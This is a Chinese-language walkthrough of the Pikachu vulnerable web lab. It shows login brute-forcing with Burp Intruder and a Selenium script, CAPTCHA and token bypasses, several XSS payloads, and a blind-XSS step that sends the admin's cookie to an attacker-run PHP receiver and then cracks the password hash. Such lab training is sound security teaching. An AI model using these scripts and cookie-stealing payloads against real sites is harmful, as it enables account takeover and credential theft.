一个综合 Web 靶场.

## 1. 安装

安装依赖

```
apt install -y apache2 mariadb-server mariadb-client php php-mysqli php-gd libapache2-mod-php
```

下载

```
git clone https://github.com/zhuifengshaonianhanlu/pikachu.git /var/www/html/pikachu
```

修改运行权限

```
chown -R www-data:www-data /var/www/html/
```

配置数据库密码

```
vim /var/www/html/pikachu/inc/config.inc.php
```

```php
11 define('DBPW', '');//将root修改为连接mysql的密码，如果改了还是连接不上，请先手动连接下你的数据库，确保数据库服务没问题在说!
11	define('DBPW', '123456');//将root修改为连接mysql的密码，如果改了还是连接不上，请先手动连接下你的数据库，确保数据库服务没问题在说!
```

更新失效的常量

```
vim /var/www/html/pikachu/vul/csrf/csrfget/csrf_get_edit.php
```

```php
70 $data=mysqli_fetch_array($result, MYSQL_ASSOC);
70 $data=mysqli_fetch_array($result, MYSQLI_ASSOC);
```

```
vim /var/www/html/pikachu/vul/csrf/csrfpost/csrf_post_edit.php
```

```php
70 $data=mysqli_fetch_array($result, MYSQL_ASSOC);
70 $data=mysqli_fetch_array($result, MYSQLI_ASSOC);
```

```
vim /var/www/html/pikachu/vul/csrf/csrftoken/token_get_edit.php
```

```php
76 $data=mysqli_fetch_array($result, MYSQL_ASSOC);
76 $data=mysqli_fetch_array($result, MYSQLI_ASSOC);
```

## 2. 初始化

访问链接初始化

> http://debian/pikachu/install.php

## 3. 使用

访问

> http://debian/pikachu/index.php

### 3.1. 暴力破解

### 3.1.1. 基于表单的暴力破解

> http://centos7-6.local/pikachu/vul/burteforce/bf_form.php

直接提交，返回 `用户名不能为空` 

提交任意用户名和密码，返回 `username or password is not exists～` 

```
admin123
admin456
```

开启 burp 拦截，提交任意用户名和密码，截获请求数据包

在重放器中发送，提取反馈特征

> 只保留必要的行

```http
POST /pikachu/vul/burteforce/bf_form.php HTTP/1.1
Host: a-centos7-6.local
Content-Length: 48
Content-Type: application/x-www-form-urlencoded
Referer: http://centos7-6.local/pikachu/vul/burteforce/bf_form.php
Cookie: PHPSESSID=uul1nmaj422fj45edddfspb5v5

username=admin123&password=admin456&submit=Login
```

![在重放器中发送，提取反馈特征](./../../../../images/Pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9C%A8%E9%87%8D%E6%94%BE%E5%99%A8%E4%B8%AD%E5%8F%91%E9%80%81%EF%BC%8C%E6%8F%90%E5%8F%96%E5%8F%8D%E9%A6%88%E7%89%B9%E5%BE%81.png)

```
username or password is not exists
```

> 不要包含特殊字符

发送到 Intruder

攻击类型：Clusterbomb

添加 payload 位置

```
username=§admin123§&password=§admin456§&submit=Login
```

payload 集：1

payload 类型：指定文件

选择文件

```
C:\Users\Administrator\Desktop\username_top500.txt
```

关闭 url 编码

payload 集：2

payload 类型：指定文件

选择文件

```
C:\Users\Administrator\Desktop\password_top500.txt
```

关闭 url 编码

最大发送请求：1

清空检索 - 匹配

添加反馈特征

```
username or password is not exists
```

若没有检测到反馈特征的则爆破成功

```
admin
123456
```

![没有检测到反馈特征的则爆破成功](./../../../../images/Pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%B2%A1%E6%9C%89%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8F%8D%E9%A6%88%E7%89%B9%E5%BE%81%E7%9A%84%E5%88%99%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F.png)

### 3.1.2. 验证码绕过(on server)

> http://centos7-6.local/pikachu/vul/burteforce/bf_server.php

直接提交，返回 `用户名不能为空`

提交任意用户名和密码

```
admin123
admin456
```

不输入验证码，返回 `验证码不能为空哦！` 

输入错误的验证码，返回 `验证码输入错误哦！` 

输入正确的验证码，返回 `username or password is not exists～` 

开启 burp 拦截，提交任意用户名和密码，输入正确的验证码，截获请求数据包

在重放器中发送，查看反馈特征

> 只保留必要的行，并删除验证码
>
> 在实践中发现需要保留 cookie ，以校验验证码

```http
POST /pikachu/vul/burteforce/bf_server.php HTTP/1.1
Host: a-centos7-6.local
Content-Length: 61
Content-Type: application/x-www-form-urlencoded
Referer: http://centos7-6.local/pikachu/vul/burteforce/bf_server.php
Cookie: PHPSESSID=uul1nmaj422fj45edddfspb5v5

username=admin123&password=admin456&vcode=&submit=Login
```

若返回 `验证码不能为空哦！` ，则证明验证码功能有效

若返回  `username or password is not exists～` ，则证明验证码功能无效

使用页面渲染，发现在验证码为空的情况下验证码功能有效

![使用页面渲染，发现在验证码为空的情况下验证码功能有效](./../../../../images/Pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87(on%20server)/%E4%BD%BF%E7%94%A8%E9%A1%B5%E9%9D%A2%E6%B8%B2%E6%9F%93%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%9C%A8%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%BA%E7%A9%BA%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E9%AA%8C%E8%AF%81%E7%A0%81%E5%8A%9F%E8%83%BD%E6%9C%89%E6%95%88.png)

在重放器中发送，查看反馈特征

> 只保留必要的行，并填写错误的验证码
>
> 在实践中发现需要保留 cookie ，以校验验证码

```http
POST /pikachu/vul/burteforce/bf_server.php HTTP/1.1
Host: a-centos7-6.local
Content-Length: 61
Content-Type: application/x-www-form-urlencoded
Referer: http://centos7-6.local/pikachu/vul/burteforce/bf_server.php
Cookie: PHPSESSID=uul1nmaj422fj45edddfspb5v5

username=admin123&password=admin456&vcode=123456&submit=Login
```

若返回 `验证码输入错误哦！` ，则证明验证码功能有效

若返回  `username or password is not exists～` ，则证明验证码功能无效

使用页面渲染，发现在验证码错误的情况下验证码功能有效

![使用页面渲染，发现在验证码错误的情况下验证码功能有效](./../../../../images/Pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87(on%20server)/%E4%BD%BF%E7%94%A8%E9%A1%B5%E9%9D%A2%E6%B8%B2%E6%9F%93%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%9C%A8%E9%AA%8C%E8%AF%81%E7%A0%81%E9%94%99%E8%AF%AF%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E9%AA%8C%E8%AF%81%E7%A0%81%E5%8A%9F%E8%83%BD%E6%9C%89%E6%95%88.png)

在重放器中发送，查看反馈特征

> 只保留必要的行，并填写正确的验证码，发送多次，每次使用不同的用户名和密码
>
> 在实践中发现需要保留 cookie ，以校验验证码

```http
POST /pikachu/vul/burteforce/bf_server.php HTTP/1.1
Host: a-centos7-6.local
Content-Length: 61
Content-Type: application/x-www-form-urlencoded
Referer: http://centos7-6.local/pikachu/vul/burteforce/bf_server.php
Cookie: PHPSESSID=uul1nmaj422fj45edddfspb5v5

username=admin123&password=admin456&vcode=jp2q8x&submit=Login
```

若返回 `验证码输入错误哦！` ，则证明验证码功能有生存期

若返回  `username or password is not exists～` ，则证明验证码功能无生存期，或者生存期较长

使用页面渲染，发现验证码功能无生存期，或者生存期较长

![使用页面渲染，发现验证码功能无生存期，或者生存期较长](./../../../../images/Pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87(on%20server)/%E4%BD%BF%E7%94%A8%E9%A1%B5%E9%9D%A2%E6%B8%B2%E6%9F%93%EF%BC%8C%E5%8F%91%E7%8E%B0%E9%AA%8C%E8%AF%81%E7%A0%81%E5%8A%9F%E8%83%BD%E6%97%A0%E7%94%9F%E5%AD%98%E6%9C%9F%EF%BC%8C%E6%88%96%E8%80%85%E7%94%9F%E5%AD%98%E6%9C%9F%E8%BE%83%E9%95%BF.png)

> 则证明验证码无生存期，或者生存期较长

发送到 Intruder

攻击类型：Clusterbomb

添加 payload 位置

```
username=§admin123§&password=§admin456§&submit=Login
```

payload 集：1

payload 类型：指定文件

选择文件

```
C:\Users\Administrator\Desktop\username_top500.txt
```

关闭 url 编码

payload 集：2

payload 类型：指定文件

选择文件

```
C:\Users\Administrator\Desktop\password_top500.txt
```

关闭 url 编码

最大发送请求：1

清空检索 - 匹配

添加反馈特征

```
username or password is not exists
```

若没有检测到反馈特征的则爆破成功

![若没有检测到反馈特征的则爆破成功](./../../../../images/Pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87(on%20server)/%E8%8B%A5%E6%B2%A1%E6%9C%89%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8F%8D%E9%A6%88%E7%89%B9%E5%BE%81%E7%9A%84%E5%88%99%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F.png)

### 3.1.3. 验证码绕过(on client)

> http://centos7-6.local/pikachu/vul/burteforce/bf_client.php

检查验证码元素

```html
<input type="text" onclick="createCode()" readonly="readonly" id="checkCode" class="code" style="width: 100px">
```

![检查验证码元素](./../../../../images/Pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87(on%20client)/%E6%A3%80%E6%9F%A5%E9%AA%8C%E8%AF%81%E7%A0%81%E5%85%83%E7%B4%A0.png)

> 发现 `createCode()` 函数

查看源码，查找 `createCode()` 相关代码

```js
<script language="javascript" type="text/javascript">
    var code; //在全局 定义验证码
    function createCode() {
        code = "";
        var codeLength = 5;//验证码的长度
        var checkCode = document.getElementById("checkCode");
        var selectChar = new Array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9,'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z');//所有候选组成验证码的字符，当然也可以用中文的

        for (var i = 0; i < codeLength; i++) {
            var charIndex = Math.floor(Math.random() * 36);
            code += selectChar[charIndex];
        }
        //alert(code);
        if (checkCode) {
            checkCode.className = "code";
            checkCode.value = code;
        }
    }

    function validate() {
        var inputCode = document.querySelector('#bf_client .vcode').value;
        if (inputCode.length <= 0) {
            alert("请输入验证码！");
            return false;
        } else if (inputCode != code) {
            alert("验证码输入错误！");
            createCode();//刷新验证码
            return false;
        }
        else {
            return true;
        }
    }


    createCode();
</script>
```

> 发现目标使用 javascript 在前端校验验证码，猜测后端没有校验

开启 burp 拦截，提交任意用户名和密码，输入正确的验证码，截获请求数据包

在重放器中发送，查看反馈特征

> 只保留必要的行，并删除验证码或者填写错误的验证码

```http
POST /pikachu/vul/burteforce/bf_client.php HTTP/1.1
Host: a-centos7-6.local
Content-Length: 61
Content-Type: application/x-www-form-urlencoded
Referer: http://centos7-6.local/pikachu/vul/burteforce/bf_client.php

username=admin123&password=admin456&vcode=123456&submit=Login
```

若返回  `username or password is not exists～` ，则证明验证码功能只在前端校验

使用页面渲染，发现在验证码为空或者错误的情况下验证码功能有效

![使用页面渲染，发现在验证码为空或者错误的情况下验证码功能有效](./../../../../images/Pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87(on%20client)/%E4%BD%BF%E7%94%A8%E9%A1%B5%E9%9D%A2%E6%B8%B2%E6%9F%93%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%9C%A8%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%BA%E7%A9%BA%E6%88%96%E8%80%85%E9%94%99%E8%AF%AF%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E9%AA%8C%E8%AF%81%E7%A0%81%E5%8A%9F%E8%83%BD%E6%9C%89%E6%95%88.png)

> 验证码功能只在前端校验
>
> burp 不执行前端代码

发送到 Intruder

攻击类型：Clusterbomb

添加 payload 位置

```
username=§admin123§&password=§admin456§&submit=Login
```

payload 集：1

payload 类型：指定文件

选择文件

```
C:\Users\Administrator\Desktop\username_top500.txt
```

关闭 url 编码

payload 集：2

payload 类型：指定文件

选择文件

```
C:\Users\Administrator\Desktop\password_top500.txt
```

关闭 url 编码

最大发送请求：1

清空检索 - 匹配

添加反馈特征

```
username or password is not exists
```

若没有检测到反馈特征的则爆破成功

![若没有检测到反馈特征的则爆破成功](./../../../../images/Pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87(on%20client)/%E8%8B%A5%E6%B2%A1%E6%9C%89%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8F%8D%E9%A6%88%E7%89%B9%E5%BE%81%E7%9A%84%E5%88%99%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F.png)

### 3.1.4. token 防爆破

> http://centos7-6.local/pikachu/vul/burteforce/bf_token.php

当使用 token 时可以使用 burp 或者 selenium 爆破，burp 仅支持在用户名或者密码已知的情况下使用

### 3.1.4.1. burp

假设用户名已知，提交用户名和任意密码，返回 `username or password is not exists～` 

开启 burp 拦截，提交用户名和任意密码，截获请求数据包

发送到 Intruder

> 只保留必要的行
>
> 在实践中发现需要保留 cookie ，以校验 token

```http
POST /pikachu/vul/burteforce/bf_token.php HTTP/1.1
Host: a-centos7-6.local
Content-Length: 79
Content-Type: application/x-www-form-urlencoded
Referer: http://centos7-6.local/pikachu/vul/burteforce/bf_token.php
Cookie: PHPSESSID=uul1nmaj422fj45edddfspb5v5

username=admin&password=admin456&token=8739965d0574a47e84766357764&submit=Login
```

攻击类型：Pitchfork

添加 payload 位置

```
username=§admin§&password=§admin456§&token=8739965d0574a47e84766357764&submit=Login
```

payload 集：1

payload 类型：指定文件

选择文件

```
C:\Users\Administrator\Desktop\password_top500.txt
```

关闭 url 编码

payload 集：2

payload 类型：递归提取

根据提示选择 extract grep 项以获取 payloads

![根据提示选择 extract grep 项以获取 payloads](./../../../../images/Pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/token%20%E9%98%B2%E7%88%86%E7%A0%B4/%E6%A0%B9%E6%8D%AE%E6%8F%90%E7%A4%BA%E9%80%89%E6%8B%A9%20extract%20grep%20%E9%A1%B9%E4%BB%A5%E8%8E%B7%E5%8F%96%20payloads.png)

> 检索 `"token"`  框选 token 值，复制

粘贴 token 值到首次请求初始 payload

![粘贴 token 值到首次请求初始 payload](./../../../../images/Pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/token%20%E9%98%B2%E7%88%86%E7%A0%B4/%E7%B2%98%E8%B4%B4%20token%20%E5%80%BC%E5%88%B0%E9%A6%96%E6%AC%A1%E8%AF%B7%E6%B1%82%E5%88%9D%E5%A7%8B%20payload.png)

关闭 url 编码

最大发送请求：1

清空检索 - 匹配

添加反馈特征

```
username or password is not exists
```

总是跟随重定向

![总是跟随重定向](./../../../../images/Pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/token%20%E9%98%B2%E7%88%86%E7%A0%B4/%E6%80%BB%E6%98%AF%E8%B7%9F%E9%9A%8F%E9%87%8D%E5%AE%9A%E5%90%91.png)

若没有检测到反馈特征的则爆破成功

![若没有检测到反馈特征的则爆破成功](./../../../../images/Pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/token%20%E9%98%B2%E7%88%86%E7%A0%B4/%E8%8B%A5%E6%B2%A1%E6%9C%89%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8F%8D%E9%A6%88%E7%89%B9%E5%BE%81%E7%9A%84%E5%88%99%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F.png)

### 3.1.4.2. selenium

下载 geckodriver

```shell
┌──(root㉿a-kali-23)-[~]
└─# proxychains4 wget https://github.com/mozilla/geckodriver/releases/download/v0.34.0/geckodriver-v0.34.0-linux64.tar.gz
```

解压

```shell
┌──(root㉿a-kali-23)-[~]
└─# tar -xzf geckodriver-v0.34.0-linux64.tar.gz
```

移动

```shell
┌──(root㉿a-kali-23)-[~]
└─# mv /root/geckodriver /usr/local/bin/
```

创建 Python 虚拟环境

```shell
┌──(root㉿a-kali-23)-[~]
└─# virtualenv venv
```

激活 Python 虚拟环境

```shell
┌──(root㉿a-kali-23)-[~]
└─# source venv/bin/activate
```

安装 selenium

```shell
┌──(venv)─(root㉿a-kali-23)-[~]
└─# pip3 install selenium
```

编写测试脚本

```shell
┌──(venv)─(root㉿a-kali-23)-[~]
└─# vim test.py
```

```python
from selenium import webdriver
from selenium.webdriver.common.by import By
import time

# 创建 Firefox 浏览器实例
browser = webdriver.Firefox()
# 访问指定网址
browser.get("https://cn.bing.com")
# 暂停程序执行 3 秒钟
time.sleep(3)
# 关闭浏览器
browser.quit()
```

测试

```shell
┌──(venv)─(root㉿a-kali-23)-[~]
└─# python3 test.py
```

> 打开 `https://cn.bing.com` 网页三秒后关闭即测试成功

编写爆破脚本

```python
┌──(venv)─(root㉿a-kali-23)-[~]
└─# vim attack.py
```

```python
from selenium import webdriver
from selenium.webdriver.common.by import By
import time

# 创建Firefox浏览器实例并打开指定URL
browser = webdriver.Firefox()
browser.get("http://centos7-6.local/pikachu/vul/burteforce/bf_token.php")  # 需要打开的URL
time.sleep(1)  # 等待页面加载

# 打开用户名字典文件
with open(r'/root/username_top500.txt', 'r', encoding="utf-8") as username_file:
    # 循环遍历用户名字典
    for username in username_file:
        # 去除用户名两端的空格
        username = username.strip()
        
        # 打开密码字典文件
        with open(r'/root/password_top500.txt', 'r', encoding="utf-8") as password_file:
            # 循环遍历密码字典
            for password in password_file:
                # 去除密码两端的空格
                password = password.strip()

                # 寻找用户名输入框位置
                find_login_box = browser.find_element(by=By.XPATH, value='/html/body/div[2]/div[2]/div/div[2]/div/div/form/label[1]/span/input')
                # 寻找密码输入框位置
                find_pass_box = browser.find_element(by=By.XPATH, value='/html/body/div[2]/div[2]/div/div[2]/div/div/form/label[2]/span/input')
                # 寻找提交按钮位置
                find_button = browser.find_element(by=By.XPATH, value='/html/body/div[2]/div[2]/div/div[2]/div/div/form/label[3]/input')

                # 输入用户名和密码
                find_login_box.clear()
                find_login_box.send_keys(username)
                find_pass_box.clear()
                find_pass_box.send_keys(password)
                time.sleep(1)  # 等待页面加载
                # 点击提交按钮
                find_button.click()
                time.sleep(1)  # 等待页面加载

                # 寻找回显信息
                loginYN = browser.find_element(by=By.XPATH, value='/html/body/div[2]/div[2]/div/div[2]/div/div/p').text
                # 判断是否登录成功
                if loginYN == "login success":
                    # 登录成功，将结果写入文件
                    with open("/root/result.txt", "a") as result_file:
                        result_file.write(f"爆破成功，用户名为：{username}，密码为：{password}\n")
                    break  # 跳出密码循环
            else:
                continue  # 若内循环未break，则继续下一次外循环
            break  # 跳出用户名循环

# 关闭浏览器
browser.quit()
```

爆破

```python
┌──(venv)─(root㉿a-kali-23)-[~]
└─# python3 attack.py
```

> 爆破成功的用户名和密码会存储在 /root/result.txt

### 3.2. Cross-Site Scripting

### 3.2.1. 反射型xss(get)

> http://centos7-6.local/pikachu/vul/xss/xss_reflected_get.php

尝试执行一个 javascript 脚本

![尝试插入一个  javascript 脚本](./../../../../images/Pikachu/Cross-Site%20Scripting/%E5%8F%8D%E5%B0%84%E5%9E%8Bxss(get)/%E5%B0%9D%E8%AF%95%E6%8F%92%E5%85%A5%E4%B8%80%E4%B8%AA%20%20javascript%20%E8%84%9A%E6%9C%AC.png)

> 发现无法填写完整字符

查看字符数限制

![查看字符数限制](./../../../../images/Pikachu/Cross-Site%20Scripting/%E5%8F%8D%E5%B0%84%E5%9E%8Bxss(get)/%E6%9F%A5%E7%9C%8B%E5%AD%97%E7%AC%A6%E6%95%B0%E9%99%90%E5%88%B6.png)

> 可以看到 `maxlength="20"` 
>
> ```html
> <input class="xssr_in" type="text" maxlength="20" name="message">
> ```

修改字符数限制

```html
<input class="xssr_in" type="text" maxlength="200" name="message">
```

执行javascript 脚本

```html
<script>alert(1);</script>
```

![执行 javascript 脚本](./../../../../images/Pikachu/Cross-Site%20Scripting/%E5%8F%8D%E5%B0%84%E5%9E%8Bxss(get)/%E6%89%A7%E8%A1%8C%20javascript%20%E8%84%9A%E6%9C%AC.png)

> 成功弹窗

### 3.2.2. 反射型xss(post)

> http://centos7-6.local/pikachu/vul/xss/xsspost/post_login.php

登录

```
admin
123456
```

执行javascript 脚本

```html
<script>alert(1);</script>
```

![执行 javascript 脚本](./../../../../images/Pikachu/Cross-Site%20Scripting/%E5%8F%8D%E5%B0%84%E5%9E%8Bxss(post)/%E6%89%A7%E8%A1%8C%20javascript%20%E8%84%9A%E6%9C%AC.png)

> 成功弹窗

### 3.2.3. 存储型xss

> http://centos7-6.local/pikachu/vul/xss/xss_stored.php

执行javascript 脚本

> 由于存储型 xss 的危害长期有效，因此建议使用在控制台返回的函数，避免打扰用户体验

```html
<script>console.log(1);</script>
```

![执行 javascript 脚本](./../../../../images/Pikachu/Cross-Site%20Scripting/%E5%AD%98%E5%82%A8%E5%9E%8Bxss/%E6%89%A7%E8%A1%8C%20javascript%20%E8%84%9A%E6%9C%AC.png)

> 成功在控制台返回

### 3.2.4. DOM型xss

> http://centos7-6.local/pikachu/vul/xss/xss_dom.php

输入任意字符串，查看反馈

![输入任意字符串，查看反馈](./../../../../images/Pikachu/Cross-Site%20Scripting/DOM%E5%9E%8Bxss/%E8%BE%93%E5%85%A5%E4%BB%BB%E6%84%8F%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%E6%9F%A5%E7%9C%8B%E5%8F%8D%E9%A6%88.png)

```html
<a href="123456">what do you see?</a>
```

> 发现字符串传入到 `a` 标签中
>
> 由此判断可以使用事件

查看源码提示

![查看源码提示](./../../../../images/Pikachu/Cross-Site%20Scripting/DOM型xss/查看源码提示.png)

```html
<script>
                    function domxss(){
                        var str = document.getElementById("text").value;
                        document.getElementById("dom").innerHTML = "<a href='"+str+"'>what do you see?</a>";
                    }
                    //试试：'><img src="#" onmouseover="alert('xss')">
                    //试试：' onclick="alert('xss')">,闭合掉就行
</script>
<!--<a href="" onclick=('xss')>-->
```

根据提示输入代码

```
' "#" onclick="alert(1);">
```

> `"#"` 是为了避免报错，添加的 `href` 的值

传输到

```html
<a href='"' "#" onclick="alert(1);">"'>what do you see?</a>
```

成对的单引号将双引号注释，相当于

```html
<a href= "#" onclick="alert(1);">"'>what do you see?</a>
```

点击反馈，触发事件

![点击反馈，触发事件](./../../../../images/Pikachu/Cross-Site%20Scripting/DOM%E5%9E%8Bxss/%E7%82%B9%E5%87%BB%E5%8F%8D%E9%A6%88%EF%BC%8C%E8%A7%A6%E5%8F%91%E4%BA%8B%E4%BB%B6.png)

或者

```
'><img src="#" onmouseover="alert(1);">
```

传输到

```html
<a href='"'><img src="#" onmouseover="alert(1);">"'>what do you see?</a>
```

成对的单引号将双引号注释，相当于

```html
<a href=><img src="#" onmouseover="alert(1);">"'>what do you see?</a>
```

> `img` 用于在 html 页面中嵌入图像不需要额外的闭合标签

将鼠标移至图像，触发事件

![将鼠标移至图像，触发事件](./../../../../images/Pikachu/Cross-Site%20Scripting/DOM%E5%9E%8Bxss/%E5%B0%86%E9%BC%A0%E6%A0%87%E7%A7%BB%E8%87%B3%E5%9B%BE%E5%83%8F%EF%BC%8C%E8%A7%A6%E5%8F%91%E4%BA%8B%E4%BB%B6.png)

### 3.2.5. DOM型xss-x

> http://centos7-6.local/pikachu/vul/xss/xss_dom.php

输入任意字符串，查看反馈

![输入任意字符串，查看反馈](./../../../../images/Pikachu/Cross-Site%20Scripting/DOM%E5%9E%8Bxss-x/%E8%BE%93%E5%85%A5%E4%BB%BB%E6%84%8F%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%E6%9F%A5%E7%9C%8B%E5%8F%8D%E9%A6%88.png)

> 发现并没有输入的字符串

尝试点击反馈，查看新的反馈

![尝试点击反馈，查看新的反馈](./../../../../images/Pikachu/Cross-Site%20Scripting/DOM%E5%9E%8Bxss-x/%E5%B0%9D%E8%AF%95%E7%82%B9%E5%87%BB%E5%8F%8D%E9%A6%88%EF%BC%8C%E6%9F%A5%E7%9C%8B%E6%96%B0%E7%9A%84%E5%8F%8D%E9%A6%88.png)

> 得到字符串的位置

```html
<a href="123456">就让往事都随风,都随风吧</a>
```

> 发现字符串传入到 `a` 标签中
>
> 由此判断可以使用事件

查看源码提示

![查看源码提示](./../../../../images/Pikachu/Cross-Site%20Scripting/DOM%E5%9E%8Bxss-x/%E6%9F%A5%E7%9C%8B%E6%BA%90%E7%A0%81%E6%8F%90%E7%A4%BA.png)

```html
<script>
                    function domxss(){
                        var str = window.location.search;
                        var txss = decodeURIComponent(str.split("text=")[1]);
                        var xss = txss.replace(/\+/g,' ');
//                        alert(xss);

                        document.getElementById("dom").innerHTML = "<a href='"+xss+"'>就让往事都随风,都随风吧</a>";
                    }
                    //试试：'><img src="#" onmouseover="alert('xss')">
                    //试试：' onclick="alert('xss')">,闭合掉就行
                </script>
```

根据提示输入代码

```
' "#" onclick="alert(1);">
```

> `"#"` 是为了避免报错，添加的 `href` 的值

传输到

```html
<a href='"' "#" onclick="alert(1);">"'>就让往事都随风,都随风吧</a>
```

成对的单引号将双引号注释，相当于

```html
<a href= "#" onclick="alert(1);">"'>就让往事都随风,都随风吧</a>
```

点击反馈，触发事件

![点击反馈，触发事件](./../../../../images/Pikachu/Cross-Site%20Scripting/DOM%E5%9E%8Bxss-x/%E7%82%B9%E5%87%BB%E5%8F%8D%E9%A6%88%EF%BC%8C%E8%A7%A6%E5%8F%91%E4%BA%8B%E4%BB%B6.png)

或者

```
'><img src="#" onmouseover="alert(1);">
```

传输到

```html
<a href='"'><img src="#" onmouseover="alert(1);">"'>what do you see?</a>
```

成对的单引号将双引号注释，相当于

```html
<a href=><img src="#" onmouseover="alert(1);">"'>what do you see?</a>
```

> `img` 用于在 html 页面中嵌入图像不需要额外的闭合标签

尝试点击反馈，查看新的反馈

![将鼠标移至图像，触发事件](./../../../../images/Pikachu/Cross-Site%20Scripting/DOM%E5%9E%8Bxss-x/%E5%B0%86%E9%BC%A0%E6%A0%87%E7%A7%BB%E8%87%B3%E5%9B%BE%E5%83%8F%EF%BC%8C%E8%A7%A6%E5%8F%91%E4%BA%8B%E4%BB%B6.png)

### 3.2.6. xss之盲打

> http://centos7-6.local/pikachu/vul/xss/xssblind/xss_blind.php

**在黑客服务器写一个接收数据的脚本**

在 kali 开启 web

```shell
┌──(root㉿kali-23)-[~]
└─# systemctl start apache2.service
```

编写 php 文件接收数据

```shell
┌──(root㉿kali-23)-[~]
└─# vim /var/www/html/upload/receive.php
```

```php
<?php
// 从 GET 请求中获取数据
$data = $_GET['data'];

// 将接收到的数据写入文件
file_put_contents('data.txt',$data);

// 将用户重定向到原页面，并终止脚本的执行
header('Location: http://centos7-6.local/pikachu/vul/xss/xssblind/admin_login.php');
exit;
?>
```

创建储存数据的文件

```shell
┌──(root㉿kali-23)-[~]
└─# touch /var/www/html/upload/data.txt
```

查看 web 权限

```shell
┌──(root㉿kali-23)-[~]
└─# ps -axu | grep apache
```

根据用户名修改网页的权限

```shell
┌──(root㉿kali-23)-[~]
└─# chown www-data:www-data /var/www/html/upload/data.txt
```

发送数据到黑客 url

```shell
[root@centos7-6 ~]# curl http://kali-23.local/upload/receive.php?data=test
```

> 黑客的 url 为 http://kali-23.local/upload/receive.php

查看文件，以验证 url 的有效性

```shell
┌──(root㉿kali-23)-[~]
└─# cat /var/www/html/upload/data.txt
```

**实战**

在留言板中发送恶意代码

> 发送以后，会导致管理员无法登录，因此只能使用一次

```html
<script>document.location = 'http://kali-23.local/upload/receive.php?data=' + document.cookie;</script>
```

![在留言板中发送恶意代码](./../../../../images/Pikachu/Cross-Site%20Scripting/xss%E4%B9%8B%E7%9B%B2%E6%89%93/%E5%9C%A8%E7%95%99%E8%A8%80%E6%9D%BF%E4%B8%AD%E5%8F%91%E9%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81.png)

进入管理员登录页面查看留言

> http://centos7-6.local/pikachu/vul/xss/xssblind/admin_login.php
>
> ```
> admin
> 123456
> ```

查看黑客获取的 cookie

```shell
┌──(root㉿kali-23)-[~]
└─# cat /var/www/html/upload/data.txt
```

```htt
ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; security=low; PHPSESSID=ha1kpi283fjsr06oto6oqqkgt4
```

开启 hash-identifier 分析加密类型

```shell
┌──(root㉿kali-23)-[~]
└─# hash-identifier
```

```
 HASH: 10470c3b4b1fed12c3baac014be15fac67c6e815
```

```
Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
```

解密

> https://www.cmd5.com/

![解密](./../../../../images/Pikachu/Cross-Site%20Scripting/xss%E4%B9%8B%E7%9B%B2%E6%89%93/%E8%A7%A3%E5%AF%86.png)

> 得到密码为：123456

### 3.2.7. xss之过滤

> http://centos7-6.local/pikachu/vul/xss/xss_01.php

输入特殊字符，查看是否过滤

```
'"<>123;
```

![输入特殊字符，查看是否过滤](./../../../../images/Pikachu/Cross-Site%20Scripting/xss%E4%B9%8B%E8%BF%87%E6%BB%A4/%E8%BE%93%E5%85%A5%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%EF%BC%8C%E6%9F%A5%E7%9C%8B%E6%98%AF%E5%90%A6%E8%BF%87%E6%BB%A4.png)

> 发现没有过滤

